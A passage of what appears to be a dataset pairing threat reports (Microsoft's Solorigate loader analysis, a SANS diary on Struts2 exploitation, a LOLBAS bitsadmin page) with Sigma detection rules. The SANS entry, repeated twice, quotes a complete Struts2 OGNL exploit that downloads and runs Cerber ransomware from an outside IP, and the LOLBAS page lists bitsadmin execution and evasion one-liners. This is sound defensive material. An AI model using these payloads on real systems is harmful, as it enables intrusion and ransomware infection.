loader used by this variant of custom loader is typically generated using a Cobalt Strike Artifact Kit template (e.g., *bypass-pipe.c*):\n\n```image\nAlt: Disassembled function from preliminary loader\nDescription: The image displays disassembled code from a preliminary loader, likely used in conjunction with the Cobalt Strike Artifact Kit. It features a series of assembly language instructions, showcasing function calls and memory manipulation relevant to the loader's operation. The highlighted section indicates the loading of a shellcode to a named pipe, which is part of the execution flow for the malicious code. This technical detail is crucial for understanding the behavior and mechanics of the TEARDROP variant custom loader.\nTranscription: |\n  sub\n  rsp, 68h\n  call GetTickCount\n  mov ecx, 26AAh\n  mov edx, 5Ch\n  mov eax, Buffer ; Buffer\n  mov r8, 5Ch\n  mov [rsp+var_18], 5Ch ;\n  mov [rsp+var_20], 65h ;\n  mov dword ptr [rsp+8], [rsp+8+lpThreadId] ;\n  mov [rsp+var_1C], 2h ;\n  mov rdx, Format\n  sprintf\n  lea r8, server_write_shellcode_to_namedpipe ; lpStartAddress\n  mov ecx, lpThreadAttributes\n  mov [rsp+lpThreadId], 0 ; lpThreadId\n  mov [rsp+8+CreationFlags], 0 ; dwCreationFlags\n  mov r9d, lpParameter\n  xor rax, rax\n  mov ecx, dwStackSize\n  call CreateThread\n  xor rax, rax\n  jmp sub_68AC15B2\n```\n\n*Figure 6. Disassembled function from preliminary loader compiled from Artifact Kit’s bypass-pipe.c template*\n\nIn its true form, the custom Artifact Kit-generated preliminary loader is a DLL that has been transformed and loaded like shellcode in memory. The preliminary loader is responsible for loading the next-stage component, which is a Beacon Reflective Loader/DLL (Cobalt Strike Beacon is compiled as a reflective DLL). The Reflective Loader ultimately initializes and executes Beacon in memory.\n\n### Variant 2: Additional custom loaders\n\nIn our investigations, we came across additional custom loaders for Cobalt Strike’s Beacon that appear to be generated using custom Cobalt Strike Artifact Kit templates. Unlike TEARDROP, in which the malicious code is triggered by an export function, the malicious code in these variants is triggered directly from the DLL’s entry point, which creates a new thread to execute the malicious code. These Variant 2 custom loaders also contain an attacker-introduced export (using varying names) whose only purpose is to call the *Sleep()* function every minute.\n\n```image\nAlt: Custom export function from a Variant 2 loader\nDescription: The image depicts a snippet of code, illustrating an exported function from a Variant 2 custom loader associated with Cobalt Strike. It shows the function '__GetClasterInf', which includes assembly code to call the 'Sleep' function every 60,000 milliseconds. The code structure indicates how the malicious code is triggered directly from the DLL's entry point, as described in the provided context.\nTranscription: |\n  ; Exported entry  2. __GetClasterInf\n  \n  ; Attributes: noreturn\n  \n  public __GetClasterInf proc near\n      sub rsp, 28h\n  \n  loc_180204674:                     ; dwMilliseconds\n      mov     ecx, 60000\n      call    cs:__imp_Sleep\n      jmp     short loc_180204674\n  __GetClasterInf endp\n```\n\n*Figure 7. Example of a custom export function from a Variant 2 loader*\n\nAdditionally, unlike TEARDROP, these variants do not contain a custom preliminary loader, meaning the loader DLL de-obfuscates and subsequently executes the Cobalt Strike Reflective DLL in memory.\n\n```image\nAlt: Structure of Variant 2 custom Loader\nDescription: The image depicts a diagram illustrating the structure of a Custom Loader DLL used in malware operations. It shows the relationship between three components: the Custom Loader DLL, a Reflective Loader, and a Beacon. The Reflective Loader is positioned inside the Custom Loader DLL, and the Beacon is represented within the Reflective Loader, indicating the hierarchy and interaction among these elements in the malware's execution process.\nTranscription: |\n  +---------------------+\n  | Custom Loader DLL   |\n  |                     |\n  | +-----------------+ |\n  | | Reflective      | |\n  | | Loader          | |\n  | |                 | |\n  | | +-------------+ | |\n  | | | Beacon      | | |\n  | | +-------------+ | |\n  | +-----------------+ |\n  +---------------------+\n```\n\n*Figure 8. Structure of Variant 2 custom Loader*\n\nThese custom loaders can be further divided into two types:\n\n- **Type A**: A set of large DLLs that decode and load the Cobalt Strike Reflective Loader from the DLL’s *DATA* section (detected as *Trojan:Win64/Solorigate.SC!dha* by Microsoft)\n- **Type B**: A set of smaller DLLs that de-obfuscate and load the Reflective Loader from the DLL’s *CODE* section (also referred to as Raindrop by Symantec, detected as *Trojan:Win64/Solorigate.SB!dha* by Microsoft)\n\n```image\nAlt: Two subtypes of the custom Loader\nDescription: The image illustrates the structure of two types of custom loaders used in Cobalt Strike: Type A and Type B (Raindrop). It visually represents the organization of each loader's CODE and DATA sections. Type A DLL is shown with the Cobalt Strike Reflective Loader located in the DATA section, while Type B DLL (Raindrop) has the Reflective Loader in the CODE section. Both loaders also contain a beacon icon, indicating their functionality in executing the Cobalt Strike Beacon.\nTranscription: |\n  Type A DLL                     Type B DLL (Raindrop)\n  ---------------------------------------------------\n  CODE Section                   CODE Section\n  ---------------------------------------------------\n                                 Cobalt Strike Reflective Loader\n                                 -------------------------------\n                                 Beacon\n  ---------------------------------------------------\n  DATA Section                   DATA Section\n  ---------------------------------------------------\n  Cobalt Strike Reflective Loader\n  -------------------------------\n  Beacon\n```\n\n*Figure 9. Two subtypes of the custom Loader*\n\nThe ultimate goal of both Type A and B loaders is to de-obfuscate and load a Cobalt Strike Reflective Loader in memory. Type A loaders use a simple rolling XOR methodology to decode the Reflective Loader, while Type B loaders (Raindrop) utilize a combination of the AES-256 encryption algorithm (unique key per sample), LZMA compression, and a single-byte XOR decoding routine to de-obfuscate the embedded Reflective Loader in memory. At the conclusion of the de-obfuscation process, both variants proceed to load the Reflective Loader in memory, which subsequently executes Cobalt Strike Beacon in memory.\n\n### Forensic observations about the Solorigate Cobalt Strike loaders\n\nMetadata and timeline analysis of the custom loaders, combined with analysis of the configuration data extracted from each Beacon payload, led to following discoveries:\n\n- The custom loader DLLs were introduced to compromised systems between the hours of 8:00 AM and 5:00 PM UTC. In one intrusion, the first second-stage custom loader (TEARDROP) was introduced to the environment by *BusinessLayerHost.exe* at around 10:00 AM UTC.\n- The custom loader DLLs dropped on disk carried compile timestamps ranging from July 2020 to October 2020, while the embedded Reflective DLLs carried compile timestamps ranging from March 2016 to November 2017. The presence of 2016-2017 compile timestamps is likely due to attackers’ usage of custom Malleable C2 profiles with synthetic compile timestamp (*compile_time*) values. At first glance it would appear as if the actor did not timestamp the compile time of the custom loader DLLs (2020 compile timestamps). However, forensic analysis of compromised systems revealed that in a few cases, the timestamp of the custom loader DLLs’ introduction to systems predated the compile timestamps of the custom loader DLLs (i.e., the DLLs appear to have been compiled at a future date).\n- Both Variant 1 and 2 custom loader DLLs were configured with PE version information that masquerades version information belonging to legitimate applications and files from Windows (e.g., *DLL*), 7-Zip (e.g., *7z.dll*), Far Manager (e.g., *Far.dll*), LibIntl (e.g., *libintl3.dll*), and other legitimate applications. The Variant 2 custom loaders were mostly compiled from open-source source code of legitimate applications, such as 7-Zip and Far Manager (i.e., the open-source source code for these applications was modified to add in the malicious code). In some instances, certain development artifacts were left behind in the custom loader samples. For example, the following C++ header (.hpp) path was observed in a loader compiled from a modified Far Manager open-source source code (*c:\\build\\workspace\\cobalt_cryptor_far (dev071)\\farmanager\\far\\platform.concurrency.hpp*):\n\n```image\nAlt: File path for a C++ header file\nDescription: The image is a hexadecimal dump showing the memory layout or binary content associated with a specific software or malware component. It includes a representation of the byte values on the left side and the corresponding ASCII characters on the right side. The highlighted sections in blue seem to indicate specific file paths or components related to a build process, likely connected to the analysis of the custom loaders mentioned in the context. This dump is likely used for forensic analysis or reverse engineering of the malware.\nTranscription: |\n  74 20 00 63 00 72 00 65 00 61 00 74 00 65 00 t.c.r.e.a.t.e.\n  2E 00 74 00 68 00 72 00 65 00 61 00 64 00 00 .t.h.r.e.a.d...\n  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n  2E 74 2E 62 2E 75 2E 69 2E 6C 2E 64 2E 00 00 .b.u.i.l.d......\n  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ..workspace.c....\n  77 6F 72 6B 73 70 61 63 65 2E 63 2E 6F 2E 00 .o.b.a.l........\n  62 2E 61 2E 6C 2E 00 00 00 00 00 00 00 00 00 .t.c.r.y.p.t.o..\n  74 2E 63 2E 72 2E 79 2E 70 2E 74 2E 00 00 00 ...f.a.t........\n  6F 2E 00 00 00 00 00 00 00 00 00 00 00 00 00 .o.r.m.a.t......\n  66 74 2E 63 2E 72 2E 79 2E 70 2E 74 2E 00 00 ...c.o.n.c.u.r.r\n  65 2E 72 2E 74 2E 00 00 00 00 00 00 00 00 00 c.y...h.p.p.....\n  61 00 64 00 6D 00 69 00 6E 00 00 00 00 00 00 .e.n.c.y........\n  74 72 65 61 64 3A 73 74 61 72 74 65 72 00 00 :thread::starter\n```\n\n*Figure 10. File path for a C++ header file (.hpp) observed in custom Cobalt Strike loader samples*\n\n- Each custom loader DLL contains a designated PE export function that either triggers the malicious functionality of the loader (in Variant 1) or calls the *Sleep()* function (Variant 2). A non-comprehensive list of these PE export function names (one per loader DLL) is included below (note the repeating *“Tk”* prefix in the export names that can be a useful indicator for hunting purposes):\n\n| Export Function Names  |\n| ---------------------- |\n| __GetClasterInf        |\n| FreeSetupRevoke        |\n| Tk_GetRootCoords       |\n| TkComputeAnchor        |\n| TkpSetMainMenubar      |\n| __RtlProjectObj        |\n| GetLimitStroke         |\n| Tk_IntersectTextLayout |\n| TkDebugBorder          |\n| TkSelPropProc          |\n| __TkGlobal             |\n| NetSetupServiceMain    |\n| Tk_NameOf3DBorder      |\n| TkFindStateString      |\n| TkWinCancelMouseTimer  |\n| _XInitImageFuncPtrs    |\n| RestVirtAlloc          |\n| Tk_PostscriptImage     |\n| TkGetDefaultScreenName |\n| TkWinClipboardRender   |\n| CreateLocalThread      |\n| SetTkPrv               |\n| Tk_QueryAllocMem       |\n| TkGrabState            |\n| XClearWindow           |\n| CreateProcessTVI       |\n| Tk_GetElementBox       |\n| Tk_SizeOfImage         |\n| TkpSetKeycodeAndState  |\n| XCreateBitmapFromData  |\n\n- In addition to the attackers dropping the custom loaders in unique locations on each system during the lateral movement phase, most Beacon and Reflective Loader instances discovered during our investigation were configured with a unique C2 domain name, unique Watermark ID, unique PE compile timestamp, PE Original Name (), DNS Idle IP (e.g., *84[.]200[.]70[.]40*, *208[.]67[.]220[.]220*, *208[.]67[.]222[.]222*, *9[.]9[.]9[.]9*, and *8[.]8[.]4[.]4*), unique User-Agent and HTTP POST/GET transaction URI, sleep time, and jitter factor. This is notable since no two Beacon instances shared the same C2 domain name, Watermark, or other aforementioned configuration values. Other than certain internal fields, most Beacon configuration fields are customizable via a Malleable C2 profile. If the actor did indeed use custom Malleable C2 profiles, as evidenced in the list above, the profiles varied greatly for Beacon instances used during different lateral movement campaigns within the same network. As mentioned above, each Beacon instance carries a unique Watermark value. Analysis of the Watermark values revealed that all Watermark values start with the number ‘3’, for example:\n\n| Watermark Values |\n| ---------------- |\n| 0x*3*0343131     |\n| 0x*3*4353633     |\n| 0x*3*8303535     |\n| 0x*3*8383238     |\n| 0x*3*2323638     |\n| 0x*3*5373331     |\n| 0x*3*8353138     |\n| 0x*3*8383430     |\n\n- As for post-exploitation artifacts, the observed Beacon instances were configured to use different “spawnto” values, which Cobalt Strike uses to spawn a temporary process and inject its post-exploitation-related components or features into the spawned process. This detail could be valuable for hunting process creation events originated by *exe*. Below are some example paths used by the observed Beacon instances:\n\n  - *%WINDIR%\\System32\\conhost.exe*\n  - *%WINDIR%\\System32\\control.exe*\n  - *%WINDIR%\\System32\\dllhost.exe*\n  - *%WINDIR%\\System32\\help.exe*\n  - *%WINDIR%\\System32\\LogonUI.exe*\n  - *%WINDIR%\\System32\\msiexec.exe*\n  - *%WINDIR%\\System32\\print.exe*\n  - *%WINDIR%\\SysWOW64\\audiodg.exe*\n  - *%WINDIR%\\SysWOW64\\help.exe*\n  - *%WINDIR%\\SysWOW64\\msiexec.exe*\n  - *%WINDIR%\\SysWOW64\\msinfo32.exe*\n  - *%WINDIR%\\SysWOW64\\print.exe*\n  - *%WINDIR%\\SysWOW64\\WerFault.exe*\n\n## Additional attacker tactics, anti-forensic behavior, and operational security\n\nAs mentioned, the attackers behind Solorigate are skillful and methodic operators who follow operations security (OpSec) best practices to minimize traces, stay under the radar, and avoid detection.\n\nDuring our in-depth analysis of the attacker’s tactics, techniques, and procedures (TTPs) seen through the lens of Microsoft 365 Defender’s rich telemetry, we observed a few techniques that are worth disclosing to help other defenders better respond to this incident and use hunting tools like Microsoft 365 Defender advanced hunting or Azure Sentinel queries to search for potential traces of past activity.\n\nSome examples of why these attackers stand out for their professional OpSec methodology and anti-forensic behavior are listed below:\n\n- Methodic avoidance of shared indicators for each compromised host. As discussed in the previous section, each Cobalt Strike DLL implant was prepared to be unique per machine and avoided at any cost overlap and reuse of folder name, file name, export function names, C2 domain/IP, HTTP requests, timestamp, file metadata, config, and child process launched. This extreme level of variance was also applied to non-executable entities, such as WMI persistence filter name, WMI filter query, passwords used for 7-zip archives, and names of output log files. Applying this level of permutations for each individual compromised machine is an incredible effort normally not seen with other adversaries and done to prevent full identification of all compromised assets inside a network or effective sharing of threat intel between victims.\n- Camouflage and blending into the environment. Tools and binaries used by the attackers (e.g., ADFIND legit tool) were always renamed and placed in folders that mimicked existing programs and files already present on a machine. This blending was not just used for files, but for other elements. For example, W",
    "sigma_rule": {
      "title": "Audit Policy Tampering Via Auditpol",
      "id": "0a13e132-651d-11eb-ae93-0242ac130002",
      "related": [
        {
          "id": "c6c56ada-612b-42d1-9a29-adad3c5c2c1e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/"
      ],
      "author": "Janantha Marasinghe (https://github.com/blueteam0ps)",
      "date": "2021-02-02",
      "modified": "2023-02-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\auditpol.exe"
          },
          {
            "OriginalFileName": "AUDITPOL.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "disable",
            "clear",
            "remove",
            "restore"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrator or administrator scripts might leverage the flags mentioned in the detection section. Either way, it should always be monitored"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_auditpol_susp_execution.yml",
    "id": "65"
  },
  {
    "url": "https://isc.sans.edu/diary/22264",
    "markdown": "# Internet Storm Center\n\n## Threat Level:\ngreen\n\n---\n\n# Java Struts2 Vulnerability Used To Install Cerber Crypto Ransomware\n\n**Published**: 2017-04-06.\n**Last Updated**: 2017-04-06\n\n1 comment(s)\n\n---\n\nWe do have a special webcast about the Struts2 Vulnerability scheduled for 11am ET today. Sign up here.\n\nSince about a month, we are tracking numerous attempts to exploit the Java Struts2 vulnerability (CVE-2017-5638). Typically, the exploits targeted Unix systems with simple Perl backdoors and bots. But recently, I saw a number of exploit attempts targeting Windows systems using a variant of the Cerber ransomware.\n\n```\n%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='\n<strong>\n<span style=\"color:#c0392b\">\nBITSAdmin.exe /Transfer JOB hxxp://82[.]165[.]129[.]119/UnInstall.exe %TEMP%/UnInstall.exe &amp; %TEMP%/UnInstall.exe\n</span>\n</strong>\n').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n```\n\nThe command executed by the exploit as shown above:\n1. The script uses BITSAdmin to download the malware (I obfuscated the URL above).\n2. The malware (\"UnInstall.exe\") is saved in the %TEMP% directory.\n3. Finally, the malware is executed.\n\nVirustotal shows pretty good coverage for this malware by now:\n\n```image\nAlt: Malware Coverage\nDescription: The image displays a VirusTotal analysis result for a file named 'UnInstall.exe'. It includes the SHA256 hash of the file, the detection ratio indicating that 24 out of 61 antivirus engines flagged the file as malicious, and the analysis date showing it was performed on April 6, 2017, at 01:53:09 UTC. The layout is typical for VirusTotal, featuring a logo at the top and a structured presentation of the analysis data.\nTranscription: |\n  SHA256: c17ee78f87a376086901791ac1b60d0bbe13f78a023882576bec7e00aceffac6\n  File name: UnInstall.exe\n  Detection ratio: 24 / 61\n  Analysis date: 2017-04-06 01:53:09 UTC (0 minutes ago)\n```\n\nThe malware reaches out to btc.blockr.io to retrieve a bitcoin wallet address for the money transfer. Encrypted files are renamed using random (encrypted) file names.\n\n```image\nAlt: Malware Execution\nDescription: The image displays a ransom note from the Cerber ransomware on a Windows 10 interface. The note informs the victim that their files have been encrypted and provides instructions on how to recover them. Key points include: the necessity of obtaining a private key and decryption program, steps to download the Tor Browser, and a link to access a personal recovery page on the dark web. The ransom note is prominently displayed in red text against a grey background, emphasizing the urgency and severity of the situation.\nTranscription: |\n  CERBER RANSOMWARE\n  \n  Instructions\n  \n  YOUR DOCUMENTS, PHOTOS, DATABASES AND OTHER IMPORTANT FILES HAVE BEEN ENCRYPTED!\n  \n  The only way to decrypt your files is to receive the private key and decryption program.\n  \n  To receive the private key and decryption program go to any decrypted folder - inside there is the special file (*_READ_THIS_FILE_* ) with complete instructions how to decrypt your files.\n  \n  If you cannot find any (*_READ_THIS_FILE_* ) file at your PC, follow the instructions below:\n  \n  1. Download \"Tor Browser\" from https://www.torproject.org/ and install it.\n  2. In the \"Tor Browser\" open your personal page here:\n     http://p27d0khpz2n7nvgr.onion/A234-1CF9-1011-0098-7BF3\n     Note! This page is available via \"Tor Browser\" only.\n  \n  Any attempts to recover files without paying will result in permanent data loss!\n```\n\n---\n\n## Comments\n\n[quote]\nThe command executed by the exploit as shown above:\n1. The script uses BITSAdmin to download the malware (I obfuscated the URL above).\n2. The malware (\"UnInstall.exe\") is saved in the %TEMP% directory.\n3. Finally, the malware is executed.\n[/quote]\n\nAs usual, pretty harmless! Only Windows administrators who still have not employed whitelisting (for example using Software Restriction Policies, available in ALL editions of Windows XP and later versions) to deny execution in %USERPROFILE% (and all other locations unprivileged users can write too) put their users at trivially avoidable risk.\n\n**Anonymous**\nApr 6th 2017",
    "sigma_rule": {
      "title": "Suspicious Download From Direct IP Via Bitsadmin",
      "id": "99c840f2-2012-46fd-9141-c761987550ef",
      "related": [
        {
          "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file using an URL that contains an IP",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_extension": {
          "CommandLine|contains": [
            "://1",
            "://2",
            "://3",
            "://4",
            "://5",
            "://6",
            "://7",
            "://8",
            "://9"
          ]
        },
        "filter_seven_zip": {
          "CommandLine|contains": "://7-"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_direct_ip.yml",
    "id": "67"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
    "markdown": "# /Bitsadmin.exe\n\n- Alternate data streams\n- Download\n- Copy\n- Execute\n\nUsed for managing background intelligent transfer\n\n## Paths:\n- C:\\Windows\\System32\\bitsadmin.exe\n- C:\\Windows\\SysWOW64\\bitsadmin.exe\n\n## Resources:\n- https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679\n- https://www.youtube.com/watch?v=_8xJaaQlpBo\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n\n## Detections:\n- Sigma: proc_creation_win_bitsadmin_download.yml\n- Sigma: proxy_ua_bitsadmin_susp_tld.yml\n- Sigma: proc_creation_win_bitsadmin_potential_persistence.yml\n- Splunk: bitsadmin_download_file.yml\n- IOC: Child process from bitsadmin.exe\n- IOC: bitsadmin creates new files\n- IOC: bitsadmin adds data to alternate data stream\n\n## Alternate data streams\n### Create a bitsadmin job\n1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.\n   ```\n   bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1\n   ```\n   - **Use case**: Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1564.004: NTFS File Attributes\n\n## Download\n### Create a bitsadmin job\n1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.\n   ```\n   bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1\n   ```\n   - **Use case**: Download file from Internet\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1105: Ingress Tool Transfer\n\n## Copy\n### Command for copying cmd.exe\n1. Command for copying cmd.exe to another folder\n   ```\n   bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset\n   ```\n   - **Use case**: Copy file\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n   - **ATT&CK® technique**: T1105: Ingress Tool Transfer\n\n## Execute\n### Create a bitsadmin job\n1. One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.\n   ```\n   bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset\n   ```\n   - **Use case**: Execute binary file specified. Can be used as a defensive evasion.\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n   - **ATT&CK® technique**: T1218: System Binary Proxy Execution",
    "sigma_rule": {
      "title": "Suspicious Download From Direct IP Via Bitsadmin",
      "id": "99c840f2-2012-46fd-9141-c761987550ef",
      "related": [
        {
          "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file using an URL that contains an IP",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_extension": {
          "CommandLine|contains": [
            "://1",
            "://2",
            "://3",
            "://4",
            "://5",
            "://6",
            "://7",
            "://8",
            "://9"
          ]
        },
        "filter_seven_zip": {
          "CommandLine|contains": "://7-"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_direct_ip.yml",
    "id": "68"
  },
  {
    "url": "https://isc.sans.edu/diary/22264",
    "markdown": "# Internet Storm Center\n\n## Threat Level:\ngreen\n\n---\n\n# Java Struts2 Vulnerability Used To Install Cerber Crypto Ransomware\n\n**Published**: 2017-04-06.\n**Last Updated**: 2017-04-06\n\n1 comment(s)\n\n---\n\nWe do have a special webcast about the Struts2 Vulnerability scheduled for 11am ET today. Sign up here.\n\nSince about a month, we are tracking numerous attempts to exploit the Java Struts2 vulnerability (CVE-2017-5638). Typically, the exploits targeted Unix systems with simple Perl backdoors and bots. But recently, I saw a number of exploit attempts targeting Windows systems using a variant of the Cerber ransomware.\n\n```\n%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='\n<strong>\n<span style=\"color:#c0392b\">\nBITSAdmin.exe /Transfer JOB hxxp://82[.]165[.]129[.]119/UnInstall.exe %TEMP%/UnInstall.exe &amp; %TEMP%/UnInstall.exe\n</span>\n</strong>\n').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n```\n\nThe command executed by the exploit as shown above:\n1. The script uses BITSAdmin to download the malware (I obfuscated the URL above).\n2. The malware (\"UnInstall.exe\") is saved in the %TEMP% directory.\n3. Finally, the malware is executed.\n\nVirustotal shows pretty good coverage for this malware by now:\n\n```image\nAlt: Malware Coverage\nDescription: The image displays a VirusTotal analysis result for a file named 'UnInstall.exe'. It includes the SHA256 hash of the file, the detection ratio indicating that 24 out of 61 antivirus engines flagged the file as malicious, and the analysis date showing it was performed on April 6, 2017, at 01:53:09 UTC. The layout is typical for VirusTotal, featuring a logo at the top and a structured presentation of the analysis data.\nTranscription: |\n  SHA256: c17ee78f87a376086901791ac1b60d0bbe13f78a023882576bec7e00aceffac6\n  File name: UnInstall.exe\n  Detection ratio: 24 / 61\n  Analysis date: 2017-04-06 01:53:09 UTC (0 minutes ago)\n```\n\nThe malware reaches out to btc.blockr.io to retrieve a bitcoin wallet address for the money transfer. Encrypted files are renamed using random (encrypted) file names.\n\n```image\nAlt: Malware Execution\nDescription: The image displays a ransom note from the Cerber ransomware on a Windows 10 interface. The note informs the victim that their files have been encrypted and provides instructions on how to recover them. Key points include: the necessity of obtaining a private key and decryption program, steps to download the Tor Browser, and a link to access a personal recovery page on the dark web. The ransom note is prominently displayed in red text against a grey background, emphasizing the urgency and severity of the situation.\nTranscription: |\n  CERBER RANSOMWARE\n  \n  Instructions\n  \n  YOUR DOCUMENTS, PHOTOS, DATABASES AND OTHER IMPORTANT FILES HAVE BEEN ENCRYPTED!\n  \n  The only way to decrypt your files is to receive the private key and decryption program.\n  \n  To receive the private key and decryption program go to any decrypted folder - inside there is the special file (*_READ_THIS_FILE_* ) with complete instructions how to decrypt your files.\n  \n  If you cannot find any (*_READ_THIS_FILE_* ) file at your PC, follow the instructions below:\n  \n  1. Download \"Tor Browser\" from https://www.torproject.org/ and install it.\n  2. In the \"Tor Browser\" open your personal page here:\n     http://p27d0khpz2n7nvgr.onion/A234-1CF9-1011-0098-7BF3\n     Note! This page is available via \"Tor Browser\" only.\n  \n  Any attempts to recover files without paying will result in permanent data loss!\n```\n\n---\n\n## Comments\n\n[quote]\nThe command executed by the exploit as shown above:\n1. The script uses BITSAdmin to download the malware (I obfuscated the URL above).\n2. The malware (\"UnInstall.exe\") is saved in the %TEMP% directory.\n3. Finally, the malware is executed.\n[/quote]\n\nAs usual, pretty harmless! Only Windows administrators who still have not employed 